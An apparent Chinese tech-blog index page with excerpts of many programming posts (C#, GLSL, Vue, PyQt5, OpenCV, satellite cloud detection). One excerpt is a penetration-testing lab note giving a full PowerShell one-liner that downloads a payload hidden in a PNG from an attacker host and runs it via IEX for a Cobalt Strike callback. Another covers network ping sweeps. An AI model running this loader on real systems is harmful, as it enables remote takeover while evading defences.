这是说你从camera继承的时候不用new这个关键字，找到对应的代码，把new去掉保存即可。 // CS0109.cs // compile with: /W:4 namespace x { public class a { public int i; } public class b : a { public new int i; public new int j; // CS0109 public static void Main() { } } } 就像这个代码，class a 里定义了i，b里重新定义自己的就需要new；而j是第一次定义，不需要new。new了就会在build导出时报错cs0109或者new keyword is not required。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a43541f01c023ad5a24e332ad06c8d28/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b87f828982892b17e8b7822cd1638a2/" rel="bookmark">
			OpenGl L3着色器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		—.着色器 着色器又叫Shader,是一种运行在GPU上的小程序。为图形渲染管线的某个特定部分运行。
着色器作用是处理输入并转换为输出。各个着色器之间不能相互影响，之间通过输入和输出进行沟通。
着色器对应的语言为 GLSL
二.GLSL GSL是一种类C语言，是为图形计算量身定制的。
着色器的开头是输入变量，输出变量，uniform和main函数。
结构如下：
#version version_number in type in_variable_name; in type in_variable_name; out type out_variable_name; uniform type uniform_name; int main() { // 处理输入并进行一些图形操作 ... // 输出处理过的结果到输出变量 out_variable_name = weird_stuff_we_processed; } 数据类型
除了C语言中默认的基础数据类型外，GLSL还有Vector(向量)和Matrix(矩阵)两种容器。
向量
GLSL的向量最多可以包含四分量，分量类型和分量个数都在定义分量名时体现：
vecn n个floativecn n个intbvecn n个bool 访问这些分量时，用.,如 vec4.x。同样，我们可以直接对GLSL中表示的颜色或者纹理坐标使用.来访问其分量。
向量支持重组和类似的拷贝操作：
vec2 someVec; vec4 differentVec = someVec.xyxx; vec3 anotherVec = differentVec.zyw; vec4 otherVec = someVec.xxxx + anotherVec.yxzy; vec2 vect = vec2(0.5, 0.7); vec4 result = vec4(vect, 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7b87f828982892b17e8b7822cd1638a2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9cbc222b4a16e90826cdc570d5f6c11/" rel="bookmark">
			【渗透测试】CS4.0的使用（四）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录 【渗透测试】CS4.0的使用（四）一、试验环境二、实验步骤1、kali端本地启动cs4.32、创建监听3、使用cs生成一个powershell的payload4、使用Invoke-PSImage生成shell图片5、将生成的图片上传到自己的服务器上6、在目标机器上执行攻击代码，cs上线 三、流量分析1、目标机器和服务器三次握手2、请求test02.png图片3、目标机和kali握手【通过444端口】4、稳定连接 【渗透测试】CS4.0的使用（四） 一、试验环境 kali：10.95.16.113
windows10：10.95.16.112 （无防护）
工具：Invoke-PSImage
https://github.com/peewpw/Invoke-PSImage
二、实验步骤 1、kali端本地启动cs4.3 kali端本地启动cs4.3的teamserver，客户端指定host为127.0.0.1启动（详情如下链接）
【渗透测试】CS4.0的使用（三）.
2、创建监听 3、使用cs生成一个powershell的payload 生成文件
4、使用Invoke-PSImage生成shell图片 powershell.exe -exec bypass "Import-Module ./Invoke-PSImage.ps1;Invoke-PSImage -Script .\payload.ps1 -image .\test01.jpg -Out .\test02.png -Web" 【使用test01.jpg图片，生成test02.png图片shell】
5、将生成的图片上传到自己的服务器上 这里由于是内网实验环境，所以使用kali起了一个http服务模拟这个环节
python3 -m http.server 80 【这里GET是112执行了命令之后触发的】
6、在目标机器上执行攻击代码，cs上线 在112的powershell中执行以下命令
powershell sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("http://10.95.16.113/test02.png"));$o=a Byte[] 3840;(0..1)|%{foreach($x in(0..1919)){$p=$g.GetPixel($x,$_);$o[$_*1920+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..3550])) 【其中http://10.95.16.113/test02.png部分修改成自己的图片网络地址】 成功上线
三、流量分析 说明： 执行了sal命令之后，目标机会先和服务器链接，然后和kali连接（实验中服务器和kali是同一台机器）
1、目标机器和服务器三次握手 2、请求test02.png图片 3、目标机和kali握手【通过444端口】 4、稳定连接 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/42011b7e2b62b1d0cd9b52acaa00c438/" rel="bookmark">
			v-for遍历Map分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.起因
2.Map分析
2.1.for (let key in Map)遍历Map
2.2.for (let value of Map)遍历Map
2.3.难道Map里面就是数组？
3.v-for遍历Map
1.起因 我想用Vue2的v-for去遍历Map，结果无法获取想要的数据，因此，正好趁这次机会记录下；
2.Map分析 2.1.for (let key in Map)遍历Map for (let key in Map)：并没有在控制台发现console.log打印语句，那么，说明Map对象并没有属性可供遍历；
2.2.for (let value of Map)遍历Map for (let value of Map)：能在控制台找到console.log打印语句，通过打印可以知道value是一个数组对象，[0]就是Map中放入的key，[1]就是Map中放入的value，而数组对象的length属性为2，其组成为：[“放入的key”,“放入的value”]
2.3.难道Map里面就是数组？ 这个[[Entries]]则说明Map其实是用数组来存储记录，且Entries自身也是一个数字；
3.v-for遍历Map 如果我这么写：v-for=”(value,key) in Map”的话，通过打印我可以得知这里的key只是数组的序号，不是真正意义上的key；
而value则是Entries数组，因此，你无法通过“value.key”/“value.value”方式来获取，而必须通过“value[0]”/“value[1]”来获取：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9cd21864157d73f45c1030c2ee10e162/" rel="bookmark">
			python安装模块时报错 Could not build wheels for cryptography which use PEP 517。。。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错信息 报错内容：Could not build wheels for cryptography which use PEP 517 and cannot be installed directly
度的结果是pip版本问题，需要删除pip-{version}.dist-info文件夹后重新升级pip
操作步骤如下
找到python进程下\venv\Lib\site-packages删除pip-{version}.dist-info文件夹，这里注意不要删错了pip文件夹
重新安装pip python -m pip install --upgrade pip 然后就可以愉快地安装模块啦
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d6c3b604fceb35b92e3f052a3da1098e/" rel="bookmark">
			vue-ssr的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章内容输出来源：拉勾教育前端高薪训练营
简单的初始化体验 安装 yarn init --yes yarn add vue vue-server-renderer 渲染一个 Vue 实例 server.js
// 第 1 步：创建一个 Vue 实例 const Vue = require('vue') const app = new Vue({ template: `&lt;div&gt;{{ msg }}&lt;/div&gt;`, data: { msg: 'Hello World', }, }) // 第 2 步：创建一个 renderer const renderer = require('vue-server-renderer').createRenderer() // 第 3 步：将 Vue 实例渲染为 HTML renderer.renderToString(app, (err, html) =&gt; { if (err) throw err console.log(html) // =&gt; &lt;div data-server-rendered="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d6c3b604fceb35b92e3f052a3da1098e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b631e163619c38ebeeaaf34a1d208a17/" rel="bookmark">
			中年人学C语言Windows程序设计，8 窗口绘图：点的画法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		中年人学C语言Windows程序设计，8 窗口绘画：点 窗口画点函数SetPixel 函数功能： SetPixel 函数将指定坐标处的像素设为指定的颜色。
API 函数原型： 注释：In 说明该参数是输入的，opt 说明该参数是可选参数。
COLORREF SetPixel( _In_ HDC hdc, _In_ int x, _In_ int y, _In_ COLORREF crColor ); 参数解析： 参数 含义
hdc 设备环境句柄
x 指定要设置的像素点的 X 轴坐标，按逻辑单位表示坐标
y 指定要设置的像素点的 Y 轴坐标，按逻辑单位表示坐标
crColor 1. 指定该像素点的颜色
2. 使用 RGB 宏创建 COLORREF 的颜色值
注释：COLORREF 颜色被定义为 DWORD 类型（4 个字节），用于表示 RGB 颜色。
返回值： 如果函数调用成功，那么返回值就是函数设置像素的 RGB 颜色值（这个值可能与 crColor 指定的颜色有所不同，之所以有时发生这种情况是因为没有找到对指定颜色进行真正匹配造成的）；
如果函数调用失败，那么返回值是 -1。
可以是以下值
返回值 含义
ERROR_INVALID_PARAMETER 一个或者多个参数不正确
备注： 如果像素点坐标位于当前剪裁区之外，那么该函数执行失败。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b631e163619c38ebeeaaf34a1d208a17/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4a5a2e5abc648468b36b866df596dfb/" rel="bookmark">
			PYQT5|异常情况处理|ImportError: DLL load failed: 找不到指定的程序。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		昨天遇到了PYQT5在pycharm里面运行时没问题，但是打包成exe运行时提示：
Traceback (most recent call last): File "a.py", line 5, in &lt;module&gt; import PyQt5.QtCore ImportError: DLL load failed: 找不到指定的程序。 所有的源码打包后都有这个问题，那么说明是环境的问题，不是代码的问题，python的环境折腾起来真的好麻烦~~~
网上到处找了很多教程和攻略，挨个试都不行，最后面没办法了，挨个排除吧，因为半个月前还是没问题的。
进入python的安装路径，找到最近的更新过的库，路径例如：
D:\Python\Python37-32\Lib\site-packages\
看到了最新哪些模块有更新，挨个将其卸载，然后重新安装，每安装一个，再进行打包，看看程序运行时的报错有没有什么变化。
如：
pip uninstall pyqt5
pip uninstall pyqt5-tools
pip uninstall sip
pip uninstall pyqt5.sip
然后重新安装：
pip install pyqt5==5.13.2
pip install pyqt5-tools
pip install sip
pip install pyqt5.sip
果然卸载PYQT5相关的包之后，报错信息不一样了。
结论是，我在验证网上下载的某个源码时，因为依赖库有改动，导致了PYQT5的版本不一致了，
目前的PyQt5是5.15.4，改成之前的pip install pyqt5==5.13.2
问题完美解决，在此记录一下，方便自己后面遇到同样的情况时，再次核对，也方便遇到同样问题的同学们，提供一个解决思路。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ed9401b778ca408a06b0aee677f9d312/" rel="bookmark">
			【KALI使用】16 主动信息收集——三层发现（）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 OSI七层模型和TCP/IP五层模型各层优点缺点 三层发现一、Ping二、traceroute —— 追踪路由三、scapy 只是记录
学习笔记
参考：这个
OSI七层模型和TCP/IP五层模型 各层优点缺点 速度可靠性路由？过滤协议二层快可靠不可路由三层（网络层比二层慢可路由经常被边界的防火墙过滤IP、icmp协议四层全端口扫描慢可靠可路由不太可能被防火墙过滤，可以发现所有端口都被过滤的主机 三层发现 原理：使用IP/ICMP;优点：相对于二层可以路由，速度较快；缺点：速度比二层慢，经常被防火墙过滤掉；理论上可以探测所有主机，前提是主机接受发的icmp数据包 一、Ping ICMP报头的Type字段一共有0 ~ 15个定义，每种定义表示不同的包的类型，用途也不一样。ping 包发出的是Type 8类型的数据包，而接收到ping包的机器，如果没有防火墙过滤的话，正常ping包响应会返回一个Type 0类型的数据包。Linux和Windows发出的ping包不同，Windows系统默认发4个ping包就结束，而Linux会一直发ping包，直到Ctrl+C结束，或者 -c 指定发包数量。
ping -R #可以路由追踪 ping 192.168 # ping目标主机，会一直ping下去，按CTRL + C 可暂停； ping 192.168. -c 2 # 使用-c参数，指定屏的次数； -ping 192.168. -c | grep ‘bytes from’ | awk ‘{print $4}’ | awk -F’:’ '{print $1}' # ping成功后，切去目标主机的IP地址； 使用shell脚本，ping这个网段
#!/bin/bash prefix=192.168.98 for addr in $(seq 1 254) do ping -c 1 $prefix.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ed9401b778ca408a06b0aee677f9d312/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16367e05775fb2ae63b59317ee6b3d46/" rel="bookmark">
			遥感影像云检测-传统算法：FMask(Object-based cloud and cloud shadow detection in Landsat imagery)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Object-based cloud and cloud shadow detection in Landsat imagery 1.概述2.背景3.FMask算法3.1.潜在云、云影和雪层3.1.1.潜在云层PCP识别一(Potential cloud layer—pass one)3.1.2.潜在云层PCP识别二(Potential cloud layer—pass two)3.1.3.云阴影层3.1.4.潜在雪层 3.2.基于对象的云和云阴影匹配 4.Fmask结果和准确性评估 Fmask首先使用基于云物理属性的规则来分离潜在云像素（PCP）和清晰天空像素。接下来，将归一化温度概率、光谱可变性概率和亮度概率结合起来，分别为陆地和水域上的云生成概率遮罩。然后，将PCP和云概率掩模一起用于推导潜在云层。 1.概述 问题：
大多数传感器都是为中等空间分辨率传感器设计的，如先进的甚高分辨率辐射计（AVHRR）和中等分辨率成像光谱辐射计（MODIS）。对于像陆地卫星这样的高空间分辨率传感器，只有一个热波段和6个光学波段位于大气窗口中，准确的云识别是困难的。当云为半透明时，云阴影的变暗效果可能很微妙，使云阴影难以检测。 2.背景 Landsat卫星数据中的云筛选是由自动云量评估（ACCA）系统进行的，ACCA通过应用大量光谱过滤器，并在很大程度上依赖于热红外波段，通常可以很好地估计每个陆地卫星场景中云的总体百分比。然而，它没有提供足够精确的云及其阴影的位置和边界，无法用于陆地卫星图像时间序列的自动分析。此外，ACCA未能识别暖卷云，并错误地将高纬度地区的雪/冰识别为云
参考：Wang等人（1999年）提出使用两幅多时相陆地卫星TM图像通过图像差分查找云及其阴影。该方法可以成功地提供精确的云和云阴影遮罩，但它高度依赖于输入图像，需要一定的时间分辨率
参考：Choi和Bindschadler（2004）提出了一种通过阴影匹配技术和自动归一化差异雪指数（NDSI）阈值检测冰盖上云的方法。该方法迭代匹配可能的云和云阴影边缘，以找到用于云检测的最佳NDSI阈值。它在冰原上运行良好，但耗时且仅对冰原表面有效。陆地卫星生态系统扰动自适应处理系统（LEDAPS）大气校正工具还生成一个内部云遮罩（Vermote&amp; Saleous，2007）。
参考： 3.FMask算法 输入数据是波段1、2、3、4、5、7和波段6亮度温度（BT）的大气顶部（TOA）反射率。对于陆地卫星L1T图像，使用LEDAPS大气校正工具将数字（DN）值转换为TOA反射率和BT（摄氏度）。然后，使用基于云和云阴影物理属性的规则提取潜在云层和潜在云阴影层。最后，利用分割出的潜在云层和几何关系匹配潜在云阴影层，生成最终云和云阴影遮罩。如果陆地卫星场景有雪，Fmask也将生成一个雪遮罩。
3.1.潜在云、云影和雪层 3.1.1.潜在云层PCP识别一(Potential cloud layer—pass one) 首先结合几个光谱测试来识别潜在的云像素（PCP）——可能是多云的像素，有时可能是清晰的像素：
由于云的明亮和寒冷的性质，所有类型的云都应该具有大于0.03（LEDAPS内部云掩蔽算法的传统）和低于27°C的BT（ACCA的传统）。云的NDSI和NDVI值通常在零左右，因为它们在光谱带中具有“白色”特征。对于某些云类型，例如植被覆盖率高的区域上的极薄云或冰云，NDVI和NDSI值可能较大，但两者都不能大于0.8，ACCA还使用NDSI阈值0.8以在第一个过程中将云与雪像素分离。
whiteness指数最初由Gomez Chova等人（2007）提出，使用可见光带之间的绝对差值和总体亮度之和来捕获此云属性。通过将差值除以可见波段的平均值，新的whiteness指数适用于LandSat卫星图像，但依旧可能包括裸露土壤、沙子和雪/冰的一些像素
针对陆地卫星数据的雾度优化转换（HOT）由Zhang等人（2002）首次提出，认为在晴朗的天空条件下，大多数陆地表面的可见光带高度相关，但蓝色和红色波长对烟雾和薄云的光谱响应不同，HOT是根据晴空像素的DN值回归经验得出的。如果使用TOA反射率作为回归的输入，则对大多数陆地卫星图像检索公式（3）。结果对于从晴空像素中分离薄雾和薄云特别有帮助。但是也可能包括一些明亮的像素，如岩石、浑水或雪/冰表面，因为它们在可见波段具有较大的TOA反射率。
该光谱测试类似于ACCA（Irish，2000）中的测试，其中使用大于1的波段4和波段5比率排除明亮的岩石和沙漠，因为它们在波段5中的反射率往往高于波段4，而云的反射率则相反。然而，该阈值也可能排除一些薄云。因此，我们将该阈值降低为0.75,该测试的主要焦点是将大部分明亮的岩石与云分离。
Water Test将所有像素分为两类：水像素和陆地像素。厚云将被识别为陆地像素，无论它们是在陆地上还是在水上（厚云阻挡了陆地和水分离的所有信息），而水面上的薄云可能仍然能够被识别为水像素。近红外波段反射率是水识别的良好指标，因为该波段的水通常较暗，而陆地通常较亮。此外，由于陆地NDVI值通常高于0.1，大部分水像素NDVI小于0.1波段4小于0.5，因此NDVI值对于分离水像素和陆地像素特别有用
通过应用上述光谱测试，Fmask将识别PCP:
3.1.2.潜在云层PCP识别二(Potential cloud layer—pass two) 识别所有PCP后，剩余像素（绝对clearsky像素）可用于计算图像中所有像素的云概率。由于陆地和水的温度分布和反射范围在空间和时间上都可能变化很大，Fmask分别计算水和陆地的云概率。
水的云概率
根据pass one中应用的“水测试”对水和陆地像素进行分类。水的云概率（wCloud_Prob）是温度概率（wttemperature_Prob）和亮度概率（brightness_Prob）的组合，计算如下
水的温度概率：
通过“水测试”和低波段7反射率阈值（等式7）识别晴空水像素
Twateris用晴空水温的较高水平（82.5%）进行估算，目的是排除通常使水温变冷的其他大气影响。
4 °C的常数用于重新缩放温度概率，因为如果像素的BT比表面温度低4°C，则其成为云像素的概率很高（Vermote&amp; Saleous，2007）。
亮度概率：
水通常是暗的，尤其是在波段5的反射率。Fmask使用归一化波段5反射率计算水面上云检测的亮度概率。通常，水的波段5反射率小于0.05，但某些混浊或浅水像素可能具有更高的反射率。最亮的水的波段5反射率可能高达0。
水的云概率：
通过结合温度概率和亮度概率计算水像素的云概率。
由于晴空水像素的BT和波段5反射率非常均匀，Fmask使用固定阈值检索水面上的云。**如果云的概率大于0.5，则将水像素标识为云像素.。**通过结合温度和亮度概率，明亮的水像素（如浅水或浑水像素）或冷水像素（较高海拔的水）将很容易从云像素中排除，因为如果其中一个概率接近零，无论另一个概率有多大，水的云概率仍然接近于零。
陆地云概率
陆地云概率（lCloud_Prob）是温度概率（lTemperature_Prob）和变率概率（variability_Prob）的组合
陆地温度概率：
如果晴空陆地像素覆盖小于0.1%（统计分析所需的最小像素）场景中的总观测值，Fmask将使用晴空像素（来自陆地和水域）计算温度概率，而不是仅使用晴空陆地像素
17.5%和82.5%的阈值来自全球云参考遮罩的敏感性分析。
由于陆地温度可能存在很大差异，Fmask使用晴空陆地温度的上下水平来规范化陆地的温度概率
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/16367e05775fb2ae63b59317ee6b3d46/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe257e891aa8620cbe33c6ddd342753a/" rel="bookmark">
			vuex的传参使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目用到过好几次vuex，有的参数复用率较高，且不是父子组件，需要服用，所以考虑用vuex来进行传参
每一个模板都有自己的templateid 后端要求，在用户操作的时候每一步都请求接口，且要携带该模块的templateid参数
首先在user.js文件构造mutations实例对象
在页面内，找到能拿到templateid参数的页面
先引入mapMutations
接着在methods方法中，写入该方法
需要一个抛出这个参数的实例方法，页面中没有事件触发，所以写在mounted里
！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
！！！！！！！！！！！！！！！！！！！前方雷区！！！！！！！！！！！！！！！！！！！！
！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
原本以为vuex参数抛出去，接收参数的页面也要引入，但是不在data里定义实例的话，会报错没有参数的实例，但是定义了以后调用方法的时候又会报错参数已经在data中存在了，就很矛盾，跟同事闲聊的时候才知道，vuex是全局管理的，参数抛出去就相当于是vue的实例 ，在页面中直接赋值调用就可以，不需要引入，下面是之前错误的示范
在需要接收参数的页面引入
要在computed里面写入要用的参数
在需要接收参数的方法里，拿到state里的参数
需要注意的是，在接收页面，需要在data里构造一个实例， 不然虽然可以接收到参数，但是会报错
但是在data中定义了实例后又会报错
所以，参数抛出去直接在接收页面用就可以了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ed62a88fbea7153f3284ecb845ecd6b/" rel="bookmark">
			VirtualBox连接外网及本机远程连接不上问题解决（针对WLAN）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		VirtualBox连接外网及本机远程连接不上问题解决（针对WLAN） 虚拟机与本机配置网卡配置网段配置配置文件设置 远程连接 虚拟机与本机配置 网卡配置 网卡1配置用于主机与虚拟机连接畅通
网卡2主要用来访问外网畅通
网段配置 本机远程连接上虚拟机的前提：虚拟机网络所处网段需保证和网卡保持一致
windows
配置文件设置 GATEWAY地址需保证和虚拟机主机网络配置的一致，网卡配置需在同一网段
dhcp主要为了访问外网配置
远程连接 完美解决问题！
另附常用操作的命令：service network restart,systemctl status firewalld
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6cb047f1a7bc618b65f02449caba6430/" rel="bookmark">
			vue项目分析--this.$store.dispatch()&amp;this.$store.commit()&amp;vuex.store()
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vue项目分析--20211012 vuex中 this.\$store.dispatch() 与 this.$store.commit()方法的区别vuex vuex中 this.$store.dispatch() 与 this.$store.commit()方法的区别 这两个的区别是存取的方式不同，两个都是传值给vuex的mutation改变state
this.$store.dispatch()含有异步操作，可以向后台提交数据
this.$store.dispatch("action的方法名",value) 存储 this.$store.commit('changeValue',name)
取值 this.$store.state.changeValue
this.$store.commit()同步操作
this.$store.commit("mutations方法名",value) 存储 this.$store.dispatch('getlists',name)
取值 this.$store.getters.getlists
实例
Vuex文件 src/store/index.js:
import Vue from "vue"; import Vuex from "vuex"; Vue.use(Vuex); export const store = new Vuex.Store({ // state专门用来保存 共享的状态值 state: { // 保存登录状态 login: false }, // mutations: 专门书写方法,用来更新 state 中的值 mutations: { // 登录 doLogin(state) { state.login = true; }, // 退出 doLogout(state) { state.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6cb047f1a7bc618b65f02449caba6430/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd41a3d44566c349a7d0a259bf2c14f5/" rel="bookmark">
			elementui遇到的问题 ——el-table
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 el-table里设置表格单行样式无效 出现问题： 将tableRowClassName函数（代码中）的返回值赋给row-class-name；
但返回值设置无效，样式不生效
解决方法 在elementUI中，row-class-name、row-style、cell-class-name等属性要想生效必须使用全局class才能生效。
所以可以把想要的样式写在css文件里并引入main.js文件
&lt;template&gt; &lt;el-table :data="tableData" style="width: 100%" :row-class-name="tableRowClassName"&gt; &lt;/el-table&gt; &lt;/template&gt; &lt;style&gt; .el-table .warning-row { background: oldlace; } .el-table .success-row { background: #f0f9eb; } &lt;/style&gt; &lt;script&gt; export default { methods: { tableRowClassName({row, rowIndex}) { if (rowIndex === 1) { return 'warning-row'; //具体对应的样式的css文件要进入main文件 } else if (rowIndex === 3) { return 'success-row'; } return ''; } }, data() { } } &lt;/script&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a6f1d99935a3855f7e5d546265513c0b/" rel="bookmark">
			C&#43;&#43;学习（三九一）vs2017 Hostx64 Hostx86 x64 x86
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\VC\Tools\MSVC\14.16.27023\bin目录下的Hostx64 Hostx86，以及再下一级的x64 x86，前者代表编译器工具集运行所在的平台，后者代表编译器build应用程序，应用程序所要运行的目标平台。
所有运行在X64主机下的编译器的目录名为hostx64,在这个目录下面的子目录文件名x64,x86代表着目标架构.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/14a682e367ec1ddeebfa5e6344b36b9a/" rel="bookmark">
			四、ubuntu20.04下找不到NVIDIA相关命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ubuntu20.04下找不到NVIDIA相关命令 4.1 检测NVIDIA驱动是否成功安装4.2 安装与当前NVIDIA显卡适配的驱动4.2.1 NVIDIA官方驱动下载安装4.2.2 使用标准Ubuntu 仓库进行自动安装 之前也炼丹过，知道nvidia显卡驱动是安装了的。最近想跑一个Elasticfusion，配置环境的时候发现nvidia驱动不能用了，于是重装，记录一下。
4.1 检测NVIDIA驱动是否成功安装 #1.查了一下显卡型号（如图，忽略我的拉胯1060）
lspci | grep VGA # 查看集成显卡 lspci | grep NVIDIA # 查看NVIDIA显卡 确定是NVIDIA显卡。
#2.查看当前显卡驱动信息
nvidia-smi 报错：NVIDIA-SMI has failed because it couldn’t communicate with the NVIDIA driver. Make sure that the latest NVIDIA driver is installed and running.
#3.调出显卡驱动程序，查看显卡驱动是否安装成
nvidia-settings 报错：找不到这个命令。
烦得很，至此已确定原来的驱动不能用了，而且既然我已经升级了Ubuntu，就想着把显卡驱动也升级到显卡能支持的比较高的版本吧。
4.2 安装与当前NVIDIA显卡适配的驱动 提供两种安装方法，2更简单。先说1。
4.2.1 NVIDIA官方驱动下载安装 特点：正规、难、麻烦。
结果：没成功，原因是我每次进入到命令模式下，都提示密码错误！！！我以人头担保我输的密码是正确的，但就是不识别。最后转用了第二种简单方法，此处仍把该法贴出来，Mark一下。
参考文档：
《Ubuntu18.04 安装nvidia显卡驱动》
《Linux安装NVIDIA显卡驱动的正确姿势》
#1.查看显卡型号
ubuntu-drivers devices 这里不是废话，跟第一次查看显卡型号不一样，这里会推荐适合你的显卡的nvidia驱动版本。如图提示我recommended 470主版本。
#2.下载推荐的驱动版本
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/14a682e367ec1ddeebfa5e6344b36b9a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c3b273d9e3c85d669cea586a966aaf47/" rel="bookmark">
			opencv4(五) VideoCapture获取摄像头图像
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		环境：ubuntu18.04 opencv4.4.0 摄像头：usb摄像头，挺老的摄像头，还是usb2.0的
csi摄像头也支持这种方法
插入摄像头后 ls /dev可以看到 /dev/video0
video后面的数字就是后面需要的设备id
代码段摘自opencv手册，基本使用这段代码就够用了
#include &lt;opencv2/core.hpp&gt; #include &lt;opencv2/videoio.hpp&gt; #include &lt;opencv2/highgui.hpp&gt; #include &lt;iostream&gt; #include &lt;stdio.h&gt; using namespace cv; using namespace std; int main(int, char**) { Mat frame; //--- INITIALIZE VIDEOCAPTURE VideoCapture cap; // open the default camera using default API // cap.open(0); // OR advance usage: select any API backend int deviceID = 0; // 0 = open default camera int apiID = cv::CAP_ANY; // 0 = autodetect default API // open selected camera using selected API cap.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c3b273d9e3c85d669cea586a966aaf47/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b56a63397b9d0ea96e3266870f032857/" rel="bookmark">
			跨域的简单实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		利用flask启动后端服务器，前端是使用原生的js实现的。
只需要在后端响应头中增加 Access-Control-Allow-Origin 参数，如果想让所有的域都可以访问，那值设为 “*”就行。
后端代码：
from flask import Flask app = Flask(__name__) @app.route('/') def hello_world(): return 'Hello World!', 200, [ ("Access-Control-Allow-Origin", "*") ] if __name__ == '__main__': app.run() 前端代码：
`
&lt;title&gt;Ajax starting point&lt;/title&gt; &lt;style&gt; html, pre { font-family: sans-serif; } body { width: 500px; margin: 0 auto; background-color: #ccc; } pre { line-height: 1.5; letter-spacing: 0.05rem; padding: 1rem; background-color: white; } label { width: 200px; margin-right: 33px; } select { width: 350px; padding: 5px; } &lt;/style&gt; &lt;!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b56a63397b9d0ea96e3266870f032857/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cc9b481d0ce15dfca39524118a9bdaf2/" rel="bookmark">
			Java语言,输入年月，输出该月的天数。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		（能被4整除并且不能被100整除或者能被400整除的数是闰年,闰年即有366天,也就是2月份有29天!!!）
注：小编用的是switch语句实现的哈!!!(欢迎评论区留言更多其他的解法)
